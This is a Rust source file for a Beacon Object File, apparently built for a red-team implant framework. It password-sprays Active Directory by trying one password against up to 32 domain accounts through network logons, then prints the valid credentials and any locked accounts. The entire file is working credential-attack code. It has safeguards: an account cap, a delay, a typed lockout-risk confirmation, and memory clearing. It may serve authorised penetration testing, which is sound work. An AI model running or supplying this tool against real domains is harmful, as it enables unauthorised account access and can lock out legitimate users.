//! # Spray AD BOF
//!
//! Validates one password against a bounded comma-separated account list with
//! network logons. Successful tokens are closed immediately and no process is
//! created. Incorrect use can lock accounts.
//!
//! ## MITRE ATT&CK
//! - T1110.003 - Brute Force: Password Spraying
//!
//! ## Arguments
//! - `str`: Domain name.
//! - `str`: Comma-separated usernames, maximum 32.
//! - `str`: Password.
//! - `int`: Delay between attempts in milliseconds, 0 to 60000.
//! - `str`: Literal `I_UNDERSTAND_LOCKOUT_RISK` confirmation.

#![no_std]

use alloc::string::String;
use rustbof::data::DataParser;
use rustbof::str::to_wide;
use rustbof::{eprintln, println};
use windows_sys::Win32::{
    Foundation::{CloseHandle, ERROR_ACCOUNT_LOCKED_OUT, ERROR_LOGON_FAILURE, FALSE, GetLastError},
    Security::{LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, LogonUserW},
    System::Threading::Sleep,
};

const CONFIRMATION: &str = "I_UNDERSTAND_LOCKOUT_RISK";
const MAX_ACCOUNTS: usize = 32;

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);
    let domain = String::from(parser.get_str());
    let users = String::from(parser.get_str());
    let password = String::from(parser.get_str());
    let delay = parser.get_int().clamp(0, 60_000) as u32;
    let confirmation = parser.get_str();
    if confirmation != CONFIRMATION {
        eprintln!("[-] Lockout-risk confirmation is required.");
        return;
    }
    if domain.is_empty() || domain.len() > 256 || users.is_empty() || password.len() > 1024 {
        eprintln!("[-] Invalid domain, username list, or password.");
        return;
    }

    let domain = to_wide(&domain);
    let mut password = to_wide(&password);
    let mut attempted = 0usize;
    let mut valid = 0usize;
    let mut locked = 0usize;
    for user in users
        .split(',')
        .map(str::trim)
        .filter(|user| !user.is_empty())
    {
        if attempted == MAX_ACCOUNTS {
            println!("[*] Account limit reached; remaining values were not attempted.");
            break;
        }
        if user.len() > 256 {
            eprintln!("[-] Skipping an overlong username.");
            continue;
        }

        let user_wide = to_wide(user);
        let mut token = core::ptr::null_mut();
        let result = unsafe {
            LogonUserW(
                user_wide.as_ptr(),
                domain.as_ptr(),
                password.as_ptr(),
                LOGON32_LOGON_NETWORK,
                LOGON32_PROVIDER_DEFAULT,
                &mut token,
            )
        };
        attempted += 1;
        if result != FALSE {
            valid += 1;
            println!(
                "[+] Valid credential: {}\\{}",
                String::from_utf16_lossy(&domain[..domain.len() - 1]),
                user
            );
            unsafe { CloseHandle(token) };
        } else {
            let error = unsafe { GetLastError() };
            if error == ERROR_ACCOUNT_LOCKED_OUT {
                locked += 1;
                eprintln!("[-] Account locked: {}", user);
            } else if error == ERROR_LOGON_FAILURE {
                println!("[-] Invalid credential: {}", user);
            } else {
                eprintln!("[-] Validation error for {}: {}", user, error);
            }
        }

        if delay != 0 && attempted < MAX_ACCOUNTS {
            unsafe { Sleep(delay) };
        }
    }
    password.fill(0);
    println!(
        "[+] Password validation complete: attempted={} valid={} locked={}",
        attempted, valid, locked
    );
}
